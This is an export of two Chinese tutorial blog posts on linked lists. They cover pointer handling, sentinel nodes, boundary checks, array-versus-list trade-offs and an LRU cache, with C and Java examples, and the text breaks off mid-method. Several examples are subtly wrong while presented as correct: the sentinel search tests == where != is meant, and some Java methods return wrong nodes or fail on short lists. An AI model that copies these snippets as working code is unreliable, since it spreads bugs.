    <content type="text"><![CDATA[上一节讲了链表相关的基础知识，有人可能会说基础知识我都掌握了，但是写链表代码还是很费劲怎么办？确实是这样的，想要写好链表代码并不是容易的事，尤其是那些复杂的链表操作，比如链表反转、有序链表合并等，写的时候非常容易出错。 为什么链表代码这么难写？究竟怎么样才能比较轻松的写出正确的链表代码呢？ 只要愿意投入时间，我觉得大多数人都是可以学会的。比如，如果你真能花一整天或者一个周末，就去写链表反转这一个代码，多写几次，知道能毫不费力的写出bug free的代码，这个坎儿还会很难跨吗？ 当然，自己有决心并且付出精力是成功的先决条件，除此之外，我们还需要掌握一些技巧和方法。下面我总结了几个写链表的代码技巧，如果能熟练掌握这几个技巧，叫上主动和坚持，轻松拿下链表代码完全没有问题。 理解指针或引用的含义事实上，看懂链表的结构并不是很难，但是一旦把它和指针混在一起，就很容易让人摸不着头脑。所以要想写好链表代码，首先就要理解好指针。 有些语言有“指针”的概念，比如C语言，有些语言没有指针，取而代之的是“引用”，比如Java、Python等。不管是指针还是引用，实际上，它们的意思都是一样的，都是存储所指对象的内存地址。 接下来，我会拿C语言中的指针来讲解。如果你用的是Java或者其他语言也没关系，把它理解成引用就可以了。 实际上，对于指针的理解，只需要记住下面这句话就可以了：将某个变量赋值给指针，实际上就是将这个变量的地址赋值给指针，或者反过来说，指针中存储了这个变量的内存地址，指向了这个变量，通过指针就能找到这个变量。 在编写链表代码的时候，经常会有这样的代码：p-&gt;next = q，这行代码是说p结点中的next指针存储了q结点的内存地址。还有一个更复杂的，也是写链表代码经常用到的：p-&gt;next = p-&gt;next-&gt;next，意思是说p结点的next指针存储了p结点的下下一个结点的内存地址。 掌握了指针或者引用的概念，应该可以很轻松的看懂链表代码。 警惕指针丢失和内存泄露不知道你有没有这样的感觉，写链表代码的时候指针指来指去，一会就不知道指针到哪里了。所以我们在写代码的时候，一定不要弄丢了指针。 如上图所示，当我们在a结点和b结点之间插入结点c，假设当前指针p指向结点a。如果我们将代码写成下面这个样子，就会发生指针丢失和内存泄露。 12p-&gt;next = c; // 将p的next指针指向c结点c-&gt;next = p-&gt;next; //将c结点next指针指向b结点 当p-&gt;next指针在完成第一步操作之后，已经不再指向b结点了，而是指向结点c，因此，第二行代码相当于将c-&gt;next指针指向了自己。因此整个链表断裂成了两半，从结点b之后的所有结点都无法访问了。 对于有些语言来说，比如C语言，内存管理是由程序员负责的，如果没有手动释放结点对应的内存空间，就会产生内存泄露，所以，我们在插入结点时，一定要注意操作的顺序。要先将c结点的next指针指向b，再将a结点的next指针指向c，这样才不会丢失指针，导致内存泄露。 利用哨兵简化实现难度首先，我们回顾一下单链表的插入、删除操作。如果我们在结点p之后插入一个结点，只需要下面两行代码就可以了。 12new_node-&gt;next = p-&gt;next; p-&gt;next = new_node; 但是当我们向一个空链表中插入第一个结点，刚刚的逻辑就不能用了。我们需要进行下面这样的特殊处理，其中head表示链表的头结点。所以从这段代码可以看出，对于单链表的插入操作，第一个结点和其他结点的插入逻辑是不同的。 1234if (head == null)&#123; head = new_node;&#125; 同样再来看一下链表的删除操作，如果要删除p结点的后继点点，我们只需要一行代码就可以搞定： 1p-&gt;next = p-&gt;next-&gt;next； 但是如果要删除链表的最后一个结点，这样的代码就不行了。跟插入类似，我们也需要对这种情况特殊处理。代码如下： 1234if (head-&gt;next == null)&#123; head = null;&#125; 可以看出，针对链表的插入、删除操作，需要对第一个结点的插入和最后一个结点的删除情况进行特殊处理。这样代码实现起来就会很繁琐，不简洁，而且也容易因为考虑不全而出错。那如何来解决这个问题呢？ 这时上面提到的哨兵就出场了。现实中的哨兵，解决的是国家之间的边界问题。同理我们这里的哨兵也是解决“边界问题的”，不直接参与业务逻辑。 还记得如何表示一个空链表呢？head=null表示链表中没有结点了，其中head表示头结点指针，指向链表中的第一个结点。 如果我们引入哨兵结点，在任何时候，不管链表是不是为空，head指针都会一直指向这个哨兵结点。我们把这种有哨兵的链表叫做带头链表，相反，没有哨兵结点的链表叫做不带头链表。 如下我画了一个带头链表，可以发现，哨兵结点是不存储数据的。因为哨兵结点一直存在，所以插入第一个结点和插入其他结点，删除最后一个结点和删除其他结点，都可以统一为相同的代码实现逻辑。 实际上，这种利用哨兵简化编程难度的技巧，在很多代码实现中都有用到，比如插入排序、归并排序、动态规划等。这里用C语言实现一个简单的例子，不涉及语法方面的高级知识，你可以类比其他语言。 代码一： 123456789101112131415161718// 在数组a中，查找key，返回key所在的位置，其中n代表数组，a代表长度int find(char* a, int n, char key)&#123; // 边界条件处理，如果a为空，或者n&lt;=0 if(a == null || n&lt;=0)&#123; return -1; &#125; int i=0; // 这里有两个比较操作： i&lt;n 和 a[i] == key while(i&lt;n)&#123; if(a[i] == key)&#123; retrun i; &#125; ++i; &#125; retrun -1;&#125; 代码二： 12345678910111213141516171819202122232425262728293031323334// 在数组a中，查找key，返回key所在的位置，其中n代表数组，a代表长度// 为了更好的解释，这里举了个例子来说明// a = &#123;4,2,3,5,9,6&#125; key = 7int find(char* a, int n, char key)&#123; // 边界条件处理，如果a为空，或者n&lt;=0 if(a == null || n&lt;=0)&#123; return -1; &#125; // 这里因为要将a[n-1]设为哨兵，所以特殊处理这个值 if(a[n-1] == key)&#123; return n-1; &#125; // 临时变量保存a[n-1]，以便之后恢复，这里temp = 6 char temp = a[n-1]; // 把key值放到数组a[n-1]，此时a=&#123;4,2,3,5,9,7&#125; a[n-1] = key; int i=0; // 此时while循环比起代码一，少了i&lt;n这个比较操作 while(a[i] == key)&#123; ++i; &#125; // 将数组a[n-1] 恢复为原来的值 a[n-1] = temp; // 如果i = n-1，说明数组中没有要找的key if(i == n-1)&#123; return -1; &#125; // 否则，说明找到了key，位置为i else&#123; return i; &#125;&#125; 对比两段代码，在字符串a很长的时候，比如几万、几十万，你觉得那段代码执行更快呢？答案是代码二。因为两端代码中执行次数最多的就是while循环那一部分。在第二段代码中，我们通过一个哨兵a[n-1]=key，成功省掉了一个比较语句，不要小看了这一句，当积累上万次、几十万次的时候，累积的时间就很明显了。 当然，这里只是说明哨兵的作用，写代码的时候千万不要写成第二段代码那样，可读性太差了，大部分情况下，我们并不需要追求如此极致的性能。 重点留意边界条件处理软件开发中，代码在以下边界或者异常情况下，最容易产生bug。链表代码也不例外，要实现没有bug的链表代码，一定要在编写的过程中以及编写完成后，检查边界条件是否考虑全面，以及边界条件下代码是否能运行。 我经常用来检查链表代码是否正确执行的边界条件有这么几个： 如果链表为空时，代码是否能正常工作？ 如果一个链表只包含了一个结点，代码能否正常工作？ 如果链表只包含两个结点时，代码能否正常工作？ 代码逻辑在处理头结点和尾结点时，是否能正常工作？ 当你写完链表代码之后，除了看下你写的代码在正常情况下能否工作，还要看下在上面我列举的杰哥边界条件下，代码能否正常工作。 当然边界条件不止我列举的这些，针对不同的场景，可能还有特定的边界条件，需要自己去思考，不过套路都是一样的。 其实，不光是写链表代码，在写任何代码的时候，千万不要只是实现业务正常情况下的功能就行了，一定要多想想会遇到哪些边界情况或者异常情况，遇到了应该如何应对，这样写出来的代码才够健壮。 举列画图，辅助思考对于稍微复杂的链表操作，比如前面我们提到的单链表反转，指针一会指这，一会指那，总感觉脑容量不够，想不清楚。这时候可以采用举列法和画图法，来进行辅助分析。 你可以找一个具体的例子，把它画在纸上，释放一些脑容量，留更多的给逻辑思考，这样就会感觉思路清晰很多。比如往单链表中插入一个结点，可以先把各种情况都举一个例子，画出插入前和插入后的链表变化，如图所示： 看着图写代码，是不是简单多了。而且当我们写完代码之后，也可以举几个例子，画在纸上，照着代码走一遍，很容易发现代码中的Bug。 多写多练，没有捷径如果你已经理解并掌握了这些方法，但是手写代码还是会出现各种各样的错误，也不要着急，多写多练。把常见的链表操作多写几遍，出问题就一点点调试，熟能生巧。 下面我精选了5个常见的链表操作，这要把这几个操作写熟练，不熟就多练几遍，保证之后不会在害怕写链表代码。 单链表反转 链表中环的检测 两个有序链表合并 删除链表倒数第n个结点 求链表的中间结点 我觉得，写链表代码是最考验逻辑思维能力的，因为链表到处都是指针的操作，边界条件的处理，一个不慎就会产生bug。链表代码写的好坏，可以看出一个人写代码是否细心，考虑问题是否全面，思维是否缜密，所以很多面试都喜欢让人手写链表代码。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189/** * 链表的一些算法题目 */public class LinkListAlgorithm &#123; public static void main(String[] args) &#123; // 第一个链表，检测是否有环 System.out.println("链表中环的检测"); Node&lt;Integer&gt; n1 = new Node&lt;&gt;(1); Node&lt;Integer&gt; n2 = new Node&lt;&gt;(2); Node&lt;Integer&gt; n3 = new Node&lt;&gt;(3); n1.next = n2; n2.next = n3; n3.next = n1; // 1-&gt;2-&gt;3-&gt;1 System.out.println(isLoop(n1)); // true System.out.println("=========================================="); // 链表反转 System.out.println("链表反转"); Node&lt;Integer&gt; n4 = new Node&lt;&gt;(4); Node&lt;Integer&gt; n5 = new Node&lt;&gt;(5); Node&lt;Integer&gt; n6 = new Node&lt;&gt;(6); Node&lt;Integer&gt; n7 = new Node&lt;&gt;(7); n4.next = n5; n5.next = n6; n6.next = n7; System.out.println(printLinkList(n4)); // 4-&gt;5-&gt;6-&gt;7 Node&lt;Integer&gt; head = reverse(n4); System.out.println(printLinkList(head)); // 7-&gt;6-&gt;5-&gt;4 System.out.println("=========================================="); // 求链表的中间节点 System.out.println("求链表的中间节点"); Node&lt;Integer&gt; n8 = new Node&lt;&gt;(8); Node&lt;Integer&gt; n9 = new Node&lt;&gt;(9); Node&lt;Integer&gt; n10 = new Node&lt;&gt;(10); Node&lt;Integer&gt; n11 = new Node&lt;&gt;(11); Node&lt;Integer&gt; n12 = new Node&lt;&gt;(12); n8.next = n9; n9.next = n10; n10.next = n11; n11.next = n12; // 8-&gt;9-&gt;10-&gt;11-&gt;12 System.out.println(printLinkList(n8)); Node&lt;Integer&gt; mid = middle(n8); System.out.println("中间节点是： " + mid.val); // 10 System.out.println("=========================================="); // 有序链表合并 System.out.println("有序链表合并"); Node&lt;Integer&gt; n13 = new Node&lt;&gt;(13); Node&lt;Integer&gt; n14 = new Node&lt;&gt;(14); Node&lt;Integer&gt; n15 = new Node&lt;&gt;(15); n13.next = n14; n14.next = n15; System.out.println("第一个链表： "+printLinkList(n8)); System.out.println("第二个链表： "+printLinkList(n13)); head = merge(n8, n13); System.out.println("合并后的链表： "+printLinkList(head)); System.out.println("=========================================="); // 删除倒数第2个节点 Node&lt;Integer&gt; n16 = new Node&lt;&gt;(16); Node&lt;Integer&gt; n17 = new Node&lt;&gt;(17); Node&lt;Integer&gt; n18 = new Node&lt;&gt;(18); Node&lt;Integer&gt; n19 = new Node&lt;&gt;(19); n16.next = n17; n17.next = n18; n18.next = n19; System.out.println("删除前： "+printLinkList(n16)); head = deleteLastKDesc(n16, 3); System.out.println("删除后： "+printLinkList(n16)); &#125; /** 合并两个有序链表 */ private static Node&lt;Integer&gt; merge(Node&lt;Integer&gt; n1, Node&lt;Integer&gt; n2) &#123; // 确定新链表头结点 Node&lt;Integer&gt; head, p = n1, q = n2; if (p.val &gt; q.val)&#123; head = n2; q = q.next; &#125;else&#123; head = n1; p = p.next; &#125; Node&lt;Integer&gt; r = head; while (p!=null &amp;&amp;q!=null)&#123; if (p.val &lt; q.val)&#123; r.next = p; p = p.next; &#125;else &#123; r.next = q; q = q.next; &#125; r = r.next; &#125; if (p!=null)&#123; r.next = p; &#125;else&#123; r.next = q; &#125;; return head; &#125; /**查找链表中间节点*/ private static Node&lt;Integer&gt; middle(Node&lt;Integer&gt; head) &#123; if (head==null) return null; Node&lt;Integer&gt; p = head; Node&lt;Integer&gt; q = head; while (q.next !=null &amp;&amp; q.next.next!=null)&#123; q = q.next.next; p = p.next; &#125; return p; &#125; /** 链表中环的检测*/ private static boolean isLoop(Node&lt;Integer&gt; head)&#123; // 采用快慢指针法 如果两个指针相遇，则说明有环 Node&lt;Integer&gt; p = head; Node&lt;Integer&gt; q = head.next.next; while (q!=null)&#123; p = p.next; q = q.next.next; if (q == p)&#123; return true; &#125; &#125; return false; &#125; /**反转链表*/ private static Node&lt;Integer&gt; reverse(Node&lt;Integer&gt; head)&#123; if (head.next == null)return head; Node&lt;Integer&gt; p; Node&lt;Integer&gt; q; Node&lt;Integer&gt; r; p = head; q = p.next; p.next = null; while (q != null)&#123; r = q.next; q.next = p; p = q; q = r; &#125; return p; &#125; /**删除链表倒数第K个结点*/ private static Node&lt;Integer&gt; deleteLastKDesc(Node&lt;Integer&gt; head, int k)&#123; if (head == null || k &lt;0) return null; Node&lt;Integer&gt; p = head; while (p != null)&#123; p = p.next; k--; &#125; if (k == 0)&#123; return head.next; &#125; if (k &lt; 0)&#123; p = head; while (++k != 0)&#123; p = p.next; &#125; p.next = p.next.next; &#125; return p; &#125; private static class Node&lt;E&gt; &#123; E val; Node&lt;E&gt; next; Node(E e)&#123; this.val = e; &#125; &#125; private static String printLinkList(Node&lt;Integer&gt; head)&#123; StringBuilder sb = new StringBuilder(); sb.append("["); while (head !=null)&#123; if (head.next !=null) sb.append(head.val).append(", "); else sb.append(head.val); head = head.next; &#125; sb.append("]"); return sb.toString(); &#125;&#125; (adsbygoogle = window.adsbygoogle || []).push({});]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>链表</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法-链表]]></title>
    <url>%2Fposts%2F2018-09-12-%E7%AE%97%E6%B3%95-%E9%93%BE%E8%A1%A8.html</url>
    <content type="text"><![CDATA[前言 今天我们来聊聊“链表 LinkedList”这个数据结构，学习链表有什么用呢，我们先来讨论一个经典的链表使用场景，那就是LRU缓存淘汰算法。 缓存是一种提高数据读取性能的技术，在硬件设计、软件开发中都有着非常广泛的应用，比如常见的CPU缓存、数据库缓存、浏览器缓存等等。 缓存的大小有限，当缓存被占满时，那些数据应该被清理出去，那些数据应该被保留？这就需要缓存淘汰策略来决定。常见的策略有这么三种：先进先出策略FIFO(First In First Out)、最少使用策略LFU(Least Frequently Used)、最近最少使用策略LRU(Least Recently Used)。 今天我们的问题是，怎样用链表来实现一个LRU缓存淘汰策略？ 链表及其结构 相比数组，链表是一种稍微复杂一点的数据结构，掌握起来也要比数组要困难一些。数组和链表是两个非常基础、非常常用的数据结构。所以要掌握甚至精通，同时理解其思想。 我们先从底层存储结构来看一下二者的区别： 为了直观的对比，我画了一张图，从图中可以看到，数组需要一块连续的内存空间来存储，对内存的要求比较高，如果我们申请一个100MB大小的内存空间，当内存中没有连续的、足够大的内存空间时，即便剩余的总空间大于100MB，仍然会申请失败。 而链表恰恰相反，它并不需要一块连续的内存空间，他通过“指针”将一组零散的内存块连接起来使用，所以申请一块大小是100MB的链表，根本不会有问题。 链表的结构五花八门，今天我们着重介绍三种最常用的链表结构：单链表、双向链表、循环链表。 单链表首先来看最简单、最常用的单链表。我们刚讲到，链表是用指针将一组零散的内存块串联在一起，其中，我们把内存块称为链表的“结点”。为了使所有的节点串联起来，每个链表的结点出了需要保存数据之外，还需要记录链上下一个结点的地址，如图所示，我们把这个记录下一个结点指针地址的指针叫做后继指针 next。 从上面单链表的结构图中，可以发现，单链表中有两个结点是比较特殊的，分别是第一个节点和最后一个结点，我们习惯性的把第一个结点称为头结点，最后一个节点称为尾结点。其中头结点用来记录链表的基地址，我们可以通过它遍历得到整个链表。而尾结点的特殊之处在于，指针不是指向下一个结点，二是指向了一个空地址null，表示这是链表的最后一个结点。 与数组一样，链表也支持数据的插入、查找、删除操作。我们知道在进行数组的插入、删除操作时，为了保持内存的连续性，需要做大量的数据搬移操作，所以时间复杂度是O(n)。而在链表中插入或者删除一个数据，我们并不需要保持内存的连续性而搬移结点，因为链表本身的存储空间就不是连续的。所以在链表中插入删除一个数据是非常快的。 为了方便理解，我画了一张图，从图中我们可以看出，针对链表的插入和删除操作，我们只需要考虑相邻结点的指针改变，所以对应的时间复杂度为O(1)。 但是有利就有弊，链表想要随机访问第K个元素就没有数组那么高效了。因为链表中的数据并非是连续存储的，所以无法像数组那样，根据首地址和下标，通过寻址公式就可以直接计算出对应的内存地址，而是需要一个一个结点依次遍历，直到找到对应的结点。 你可以把链表想象成一个队伍，每个人都知道自己前面的人是谁，所以当我们希望知道排在第K为的人是谁的时候，就需要从第一个人开始，一个一个往下数。所以链表随机访问的性能没有数组好，时间复杂度为O(n)。 好了，单链表了解了，下面来看看另外两个复杂的链表：循环链表和双向链表。 循环链表循环链表是一种特殊的单链表。实际上，循环链表也很简单，它和单链表唯一的区别就在尾结点。我们知道，单链表的尾结点是指向空地址，表示这是最后的节点了，而循环链表的尾结点的指针是指向链表的头结点。从下图中可以看出，循环链表想一个环一样首尾相连，所以叫循环链表。 和单链表相比，循环链表的优点是从链尾到链头比较方便。当要处理的数据具有环形结构特点时，就特别适合采用循环链表，比如著名的约瑟夫问题。尽管用单链表也可以实现，但是用循环链表的话，代码就会简洁很多。 双线链表接下来再看一个稍微复杂，在实际的软件开发中，也更加常见的链表结构：双向链表。 单链表只有一个方向，节点只有一个后继指针，next指向后面的结点。而双向链表，顾名思义，它支持两个方向，每个结点不止有一个后继指针next指向后面的结点，还有一个前驱指针prev指向前面的结点。 从上图可以看出，双向链表需要额外的两个空间来存储后继结点和前驱结点的地址。所以，如果存储同样多的数据，双向链表要比单向链表占用更多的内存空间。虽然两个指针比较浪费存储空间，但可以支持双向遍历，这样也带来了双向链表的操作灵活性。那相比单向链表，双向链表适合解决哪种问题呢？ 从结构上来看，双向链表可以支持O(1)时间复杂度的情况下找到前驱结点，正是这样的特点，也使双向链表在某些情况下的删除、插入操作比单链表要简单、高效。 你可能会说，单链表的插入、删除操作的时间复杂度都已经是O(1)了，双向链表还能怎么高效呢？别着急，刚刚的分析比较偏理论，很多数据结构和算法的书籍也是这么说得，但是这种说法实际上是不准确的，或者说是有先觉条件的。 我们再来分析一下链表的两个操作，先来看删除操作。在实际的软件开发中，从链表中删除一个数据无外乎这两种情况： 删除结点中“值等于某个给定值的”结点 删除给定指针指向的结点 对于第一种情况，不管是单链表还是双向链表，为了查找到值等于某个给定值的结点，都需要从头开始一个一个依次遍历对比，知道找到值等于给定值的结点，再通过前面讲的指针操作将其删除。 尽管单纯的删除操作时间复杂度都是O(1)，但是遍历查找的时间是主要的耗时点，对应的时间复杂度为O(n)，根据时间复杂度分析中的加法法则，删除值等于给定值的结点对应的链表操作的总时间复杂度为O(n)。 对于第二种情况，我们已经找到了要删除的结点，但是删除某个结点q需要知道前驱结点，而单链表并不支持直接获取前驱结点，所以为了找到前驱结点，我们还是要从头结点开始遍历链表，知道p-&gt;next = q，说明p是q的前驱结点。 但是对于双向链表来说，这种情况就比较有优势了。因为双向链表中的结点已经保存了前驱结点的指针，不需要像单链表那样遍历。所以针对第二种情况，单链表删除操作需要O(n)的时间复杂度，而双向链表只需要在O(1)的时间复杂度内就搞定了！ 同理，如果我们希望在链表的某个指定结点前面插入一个结点，双向链表比单链表有很大优势，双向链表可以在O(1)时间复杂度搞定，而单向链表需要O(n)的时间复杂度。 除了插入、删除操作有优势之外，对于一个有序链表，双向链表的按值查找的效率也要比单向链表高一些。因为我们可以记录上次查找的位置p，每次查询时，根据要查找的值与p的大小关系，决定是向前查找还是往后查找，所以平均只需要查找一半的数据。 现在，有没有觉得双向链表比单向链表更加高效呢？这就是问什么在实际的软件开发中，双向链表尽管比较费内存，但还是比单链表的应用更加广泛的原因。如果你熟悉Java语言，你肯定用过LinkedHashMap这个容器，如果你深入研究LinkedHashMap的实现原理，就会发现其中就用到了双向链表这种数据结构。 实际上，这里有一个更重要的知识点需要你掌握，那就是用空间换时间的设计思想。当内存空间充足时，如果我们更追求代码的执行速度，我们就可以选择空间复杂度相对较高，但时间复杂度相对较低的算法和数据结构。相反，如果内存比较紧缺，比如代码跑在手机或者单机片中，这个时候，就要反过来用时间换空间的涉及思路。 还是开篇缓存的例子，缓存实际上就是利用了空间换时间的例子。虽然我们将数据存放在磁盘上，会比较节省内存，但是每次查询数据都要查询一遍磁盘，会比较慢。但是我们通过缓存技术，事先将数据加载在内存中，虽然会比较耗费内存空间，但是每次查询数据的速度就大大提高了。 所以对于执行较慢的程序，可以通过消耗更多的内存(空间换时间)进行优化；而消耗过多内存的程序，可以通过消耗更多的时间(时间换空间)来降低内存的消耗。你还能想到其他时间换空间或者空间换时间的例子吗？ 了解了循环链表和双向链表，如果把这两种链表整合在一起就是一个新的版本：双向循环链表。我想不需要我多讲，你应该知道双向循环链表长什么样子了吧？ 链表 VS 数组性能大比拼 通过前面的学习，你应该知道，数组和链表是两种截然不同的内存组织方式，正是因为内存存储的区别，他们插入、删除、随机访问的时间复杂度正好相反。 时间复杂度 数组 链表 插入删除 O(n) O(1) 随机访问 O(1) O(n) 不过，数组和链表的对比，并不能局限于时间复杂度。而且，在实际的软件开发中，不能仅仅利用复杂度分析就能决定使用那哪个数据结构来存储数据。 数组简单易用，在实现上使用的是连续的内存空间，可以借助CPU的缓存机制，预读数组中的数据，所以访问效率更高。而链表在内存中并不是连续存储，所以对CPU缓存并不好，没办法有效预读。 数组的缺点是大小固定，一经声明就要占用整块连续内存空间。如果声明的数组过大，可能没有足够的连续内存空间分配给它，导致“内存不足”。如果声明的数组过小，则可能出现不够用的情况，这时只能再申请一个更大的内存空间，把原数组拷贝进去，非常费时。链表本身没有大小的限制，天然的支持动态扩容，我觉得这也是它与数组最大的区别。 你可能会说，Java中也有ArrayList容器，也可以支持动态扩容啊？我们上一节已经讲过，当我们往支持动态扩容的数组中插入一个数据时，如果数组中没有空闲空间了，就会申请一个更大的空间，将原数组拷贝过去，而数据拷贝的操作是非常耗时的。 我举一个稍微极端的例子。如果我们用ArrayList存储了1GB大小的数据，这个时候已经没有空闲空间了，当我们再插入数据的时候，ArrayList会申请一个1.5GB的存储空间，并且把原来那1GB的数据拷贝到新申请的空间上，听起来是不是就很耗时。 除此之外，如果你的代码对内存的使用非常苛刻，那数组就更适合你。因为链表中的每个结点都需要消耗额外的内存空间去存储一份指向下一个结点的指针，所以内存消耗会翻倍。而且，对链表进行频繁的插入、删除操作，还会导致频繁的内存申请和释放，容易造成内存碎片，如果是java语言，就有可能会导致频繁的GC(Garbage Collection 垃圾回收)。 所以在实际的开发项目中，要根据不同的项目情况，权衡究竟是选择数组还是链表。 解答开篇 好了，我们现在回过头来看，如何基于链表实现LRU缓存淘汰算法？ 我的思路是这样的：我们维护一个有序单链表，越靠近链表尾部的结点是越早之前访问的。当有一个新数据被访问时，我们从链表头部开始顺序遍历链表。 如果此数据之前已经被缓存在链表中了，我们遍历得到这个数据对应的结点，并将其从原来的位置删除，再插入到链表的头部。 如果此数据没有缓存在链表中，又可以分为两种情况： 如果此时缓存未满，则将此结点直接插入到链表的头部； 如果此时缓存已满，则链表尾结点删除，将新的数据结点插入链表的头部。 这样我们就实现了一个LRU缓存，是不是很简单。 现在我们来看下缓存访问的时间复杂度是多少。因为不管缓存有没有满，我们都需要遍历一遍链表，所以这种基于链表的实现思路，缓存访问的时间复杂度为O(n)。 实际上，我们可以继续优化这个实现思路，比如引入哈希表(hash table)来记录每个数据的位置，将缓存访问的时间复杂度降到O(1)。这个优化方案，等讲到哈希表的时候再讲。 基于链表的实现思路，实际上还可以用数组来实现LRU缓存淘汰策略。如何利用数组实现LRU缓存淘汰策略？ 内容小结 今天我们讲了一种跟数组“相反”的数据结构，链表。他跟数组一样，也是非常基础、非常常用的数据结构。不过链表要比数组稍微复杂，从普通链表衍生出来好几种链表结构，比如双向链表、循环链表、双向循环链表。 和数组相比，链表更适合插入、删除操作频繁的场景，查询的时间复杂度较高。不过在具体的软件开发中，要对数组和链表的各种性能进行对比，综合来使用两者中的一个。 课后思考 如何判断一个字符串是否是回文字符串呢？今天的思考题就是基于这个问题的改造版本。如果字符串是通过单链表来存储的，那如何来判断是一个回文串呢？相应的时间空间复杂度是多少。 (adsbygoogle = window.adsbygoogle || []).push({}); 本章代码：GitHub 带头单链表代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211import java.util.NoSuchElementException;public class SinglyLinkedList&lt;T&gt;&#123; private Node&lt;T&gt; head; private int size; public SinglyLinkedList()&#123; this.head = new Node&lt;&gt;(null); &#125; // 链表头部插入值 private void linkFirst(Node&lt;T&gt; newNode)&#123; newNode.next = head.next; head.next = newNode; size++; &#125; // 链表尾部插入值 public void linkLast(T val)&#123; Node&lt;T&gt; newNode = new Node&lt;&gt;(val); linkLast(newNode); &#125; private void linkLast(Node&lt;T&gt; newNode)&#123; Node&lt;T&gt; p = head; while (p.next!=null)&#123; p=p.next; &#125; p.next = newNode; size++; &#125; // 获取头部值 public T getFirst()&#123; if (head.next == null)&#123; throw new NoSuchElementException(); &#125; return head.next.val; &#125; // 获取尾部值 public T getLast()&#123; Node&lt;T&gt; p = head.next; while (p.next!=null)&#123; p = p.next; &#125; return p.val; &#125; // 添加 public void add(T val)&#123; Node&lt;T&gt; newNode = new Node&lt;&gt;(val); linkLast(newNode); &#125; // 在某处索引插入 public void add(int index, T val)&#123; Node&lt;T&gt; newNode = new Node&lt;&gt;(val); Node&lt;T&gt; p = node(index); insert(p, newNode); &#125; private void insert(Node&lt;T&gt; p, Node&lt;T&gt; newNode)&#123; Node&lt;T&gt; q = head; while (q!=null &amp;&amp; q.next!=p)&#123; q = q.next; &#125; if (q == null)&#123; return; &#125; newNode.next = p; q.next = newNode; &#125; // 根据值删除某个节点 public boolean delete(T val)&#123; Node&lt;T&gt; p = head; while (p.next !=null &amp;&amp; !p.next.val.equals(val))&#123; p = p.next; &#125; if (p.next== null)&#123; return false; &#125; p.next = p.next.next; return true; &#125; // 根据索引删除某结点 public T delete(int index)&#123; Node&lt;T&gt; deleteNode = node(index); return deleteNode(deleteNode); &#125; private T deleteNode(Node&lt;T&gt; deleteNode)&#123; final T element = deleteNode.val; Node&lt;T&gt; p = head; while (p.next!= null &amp;&amp; p.next != deleteNode)&#123; p = p.next; &#125; if (p.next == null)&#123; return null; &#125; p.next = deleteNode.next; return element; &#125; // 根据索引获取值 public T get(int index)&#123; if (index &gt;= size || index &lt; 0)&#123; throw new IndexOutOfBoundsException("Index: "+index + ", Size: "+size); &#125; return node(index).val; &#125; // 通过value 查找对应的索引 public int indexOf(T val)&#123; int index = 0; Node&lt;T&gt; p = head; while (p.next !=null &amp;&amp; p.next.val!=val)&#123; p = p.next; index ++; &#125; if (p.next == null)&#123; index = -1; &#125; return index; &#125; public boolean contains(T val)&#123; Node&lt;T&gt; p = head; while (p.next !=null &amp;&amp; p.next.val!=val)&#123; p = p.next; &#125; return p.next != null; &#125; private Node&lt;T&gt; node(int index)&#123; if (index &gt;= size || index &lt; 0)&#123; throw new IndexOutOfBoundsException("Index: "+index + ", Size: "+size); &#125; Node&lt;T&gt; p = head.next; int i=0; while (i&lt;size)&#123; if (i == index)&#123; break; &#125; p = p.next; ++i; &#125; return p; &#125; public void push(T val)&#123; Node&lt;T&gt; newNode = new Node&lt;&gt;(val); linkFirst(newNode); &#125; public T pop()&#123; return unlinkedFirst(); &#125; private T unlinkedFirst()&#123; Node&lt;T&gt; first = head.next; if (first == null)&#123; throw new RuntimeException("没有元素"); &#125; return unlinkedFirst(first); &#125; private T unlinkedFirst(Node&lt;T&gt; node)&#123; final T element = node.val; head.next = head.next.next; node.next = null; node.val = null; size--; return element; &#125; // 单链表反转 public void reverse()&#123; // 链表为空或者链表只有一个元素时 if (head.next == null || size &lt;=1 )&#123; return; &#125; Node&lt;T&gt; p = head.next; Node&lt;T&gt; q = p.next; Node&lt;T&gt; r; p.next = null; while (q !=null)&#123; r = q.next; q.next = p; p = q; q = r; &#125; head.next = p; &#125; public int size()&#123; return size; &#125; // 打印链表 example: [1, 2, 3] @Override public String toString() &#123; if (head.next == null)&#123; return "[]"; &#125; StringBuilder sb = new StringBuilder(); sb.append("["); Node&lt;T&gt; p = head.next; while (p.next!=null)&#123; sb.append(p.val).append(", "); p = p.next; &#125; sb.append(p.val).append("]"); return sb.toString(); &#125; public static class Node&lt;T&gt;&#123; private T val; private Node&lt;T&gt; next; Node(T val)&#123; this.val = val; &#125; &#125;&#125; 基于链表的LRU缓存代码：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182public interface LRUCache&lt;T&gt; &#123; void put(T val); T get(T val); int Size();&#125;class ListLRUCache&lt;T&gt; implements LRUCache&lt;T&gt; &#123; private SinglyLinkedList&lt;T&gt; lruList; private static final int DEFAULT_CAP=10; // 缓存容量 private int cap; // 缓存使用大小 private int size; public ListLRUCache()&#123; this(DEFAULT_CAP); &#125; public ListLRUCache(int cap)&#123; this.cap = cap; this.lruList = new SinglyLinkedList&lt;&gt;(); &#125; @Override public void put(T value) &#123; // 1、缓存满了 // 如果该列表中没有该数据 if (size == cap)&#123; // 1、缓存满了 // 删除最后一个节点 lruList.delete(size-1); // 将该数据插入到链表头部 lruList.push(value); &#125;else &#123; // 2、缓存未满 // 直接在列表头部插入该数据 lruList.push(value); size++; &#125; &#125; @Override public T get(T val) &#123; T result = null; if (lruList.contains(val))&#123; // 在list中,从list中获取该数据 int index = lruList.indexOf(val); result = lruList.get(index); System.out.println("从缓存中获取"); // 将该节点插入到链表头部 lruList.delete(index); lruList.push(val); &#125;else&#123; // 